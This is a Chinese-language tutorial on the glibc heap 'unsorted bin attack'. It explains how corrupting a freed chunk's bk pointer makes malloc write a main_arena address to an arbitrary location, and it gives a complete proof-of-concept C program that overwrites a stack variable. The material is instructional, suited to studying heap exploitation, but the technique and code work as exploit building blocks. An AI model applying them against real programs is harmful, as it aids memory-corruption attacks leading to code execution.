# 漏洞利用文档：unsorted_bin_attack

## 攻击对象
攻击目标是栈上的变量 `stack_var`（地址示例：`0x7fffffffe318`）。通过利用unsorted bin的管理机制，修改释放堆块的bk指针，最终将一个大值（libc的main_arena地址）写入该栈变量地址。更一般地，此攻击可用于任意可写地址，如全局变量（例如libc中的 `global_max_fast`），以为进一步攻击（如fastbin attack）做准备。

## 利用过程
1. **堆分配**：分配两个堆块（第一个大小400字节，第二个500字节），第二个块用于防止第一个释放时与top chunk合并。
2. **释放堆块**：释放第一个堆块，它被插入unsorted bin，其bk指针指向main_arena（libc内部结构）。
3. **修改指针**：利用漏洞（如堆溢出或UAF）修改释放堆块的bk指针，指向目标地址减16（在64位系统中；32位系统减8）。
4. **触发攻击**：再次分配相同大小的堆块，触发unsorted bin处理。在unlink操作中，执行 `bk->fd = fd`，将main_arena地址写入目标地址。

## 利用条件
- **漏洞类型**：程序中存在允许修改释放堆块元数据（如bk指针）的漏洞，常见包括：
  - 堆溢出（Heap Overflow）：可覆盖相邻堆块的元数据。
  - 使用后释放（Use-After-Free, UAF）：悬空指针被用于写操作。
  - 其他内存损坏漏洞，如double free或信息泄露结合写原语。
- **堆布局**：需确保释放的堆块不被合并（例如通过分配第二个块隔离top chunk），且目标地址可写。

## 利用效果
- **直接效果**：在任意地址写入一个大值（无符号长整型，通常是libc的main_arena地址）。这本身可能不直接导致代码执行，但可用于：
  - 修改关键全局变量（如 `global_max_fast`），启用进一步攻击（如fastbin attack）。
  - 破坏堆管理结构，导致任意地址分配或控制流劫持（结合其他漏洞）。
- **间接效果**：为更高级的利用（如代码执行或权限提升）铺平道路，通常作为多阶段攻击的一部分。

## 涉及缓解机制
unsorted bin attack利用了glibc堆管理器的unlink操作缺乏充分检查的弱点。具体地，在malloc处理unsorted bin时，会执行以下代码（基于glibc源码片段）：

```c
// 伪代码来自glibc malloc.c（简化）
while ((victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) {
    bck = victim->bk; // 获取victim的bk指针
    // ... 大小检查等 ...
    /* remove from unsorted list */
    unsorted_chunks(av)->bk = bck;
    bck->fd = unsorted_chunks(av); // 漏洞点：如果bck被控制，可写任意地址
    // ...
}
```

- **缓解缺失**：unlink操作中，`bck->fd = unsorted_chunks(av)` 未验证 `bck` 是否指向合法chunk结构。如果攻击者能控制 `victim->bk`（即bck），就可将 `unsorted_chunks(av)`（main_arena地址）写入任意地址。
- **现有检查**：glibc的unlink宏有完整性检查（如 `chunk->bk->fd == chunk`），但unsorted bin处理流程中的这一步 bypass 了这些检查，因为它直接操作链表指针而不调用完整unlink宏。

## Proof of Concept
以下为漏洞利用原型源码，添加了中文注释解释关键步骤：

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
    fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var=0; // 目标栈变量，初始值为0
    fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
    fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);

    unsigned long *p=malloc(400); // 分配第一个堆块（大小400字节）
    fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
    fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
    malloc(500); // 分配第二个堆块（大小500字节），防止第一个释放时与top chunk合并

    free(p); // 释放第一个堆块，它被插入unsorted bin，其bk指针指向main_arena
    fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
           "point to %p\n",(void*)p[1]);

    //------------VULNERABILITY-----------
    // 模拟漏洞：此处直接修改释放堆块的bk指针，实际中可能通过堆溢出或UAF实现
    p[1]=(unsigned long)(&stack_var-2); // 修改bk指针指向目标地址减16（64位系统）。减2是因为chunk结构中fd和bk各占8字节，&stack_var-2相当于地址减16字节。
    fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
    fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

    //------------------------------------

    malloc(400); // 再次分配400字节堆块，触发unsorted bin attack。在内部处理中，执行bck->fd = fd，将main_arena地址写入stack_var
    fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
           "rewritten:\n");
    fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var); // 输出显示stack_var已被修改为大的libc地址
}
```

### 注释说明
- **第13行**：`malloc(400)` 分配第一个堆块，大小包括chunk header（实际分配417字节在64位系统）。
- **第16行**：`malloc(500)` 分配第二个堆块，用于隔离，防止第一个释放时合并到top chunk。
- **第19行**：`free(p)` 释放第一个堆块，它进入unsorted bin，其bk指针指向main_arena（libc内部地址）。
- **第24行**：`p[1] = ...` 模拟漏洞修改bk指针。`p[1]` 对应chunk的bk字段，修改为 `&stack_var - 2`（地址计算：在64位系统，chunk的bk偏移是8字节，减2个单元（每个8字节）即减16字节，指向伪造的chunk结构）。
- **第31行**：`malloc(400)` 触发攻击。glibc从unsorted bin取chunk时，执行 `bck->fd = unsorted_chunks(av)`，其中 `bck` 是修改后的bk指针（指向 `&stack_var - 2`），`unsorted_chunks(av)` 是main_arena地址。这导致将main_arena地址写入 `bck + 16`（即 `stack_var` 地址）。
- **第33行**：输出验证攻击成功，`stack_var` 被改写为大的libc地址。

此PoC演示了基本unsorted bin attack，实际应用中需根据目标调整地址计算和漏洞利用方式。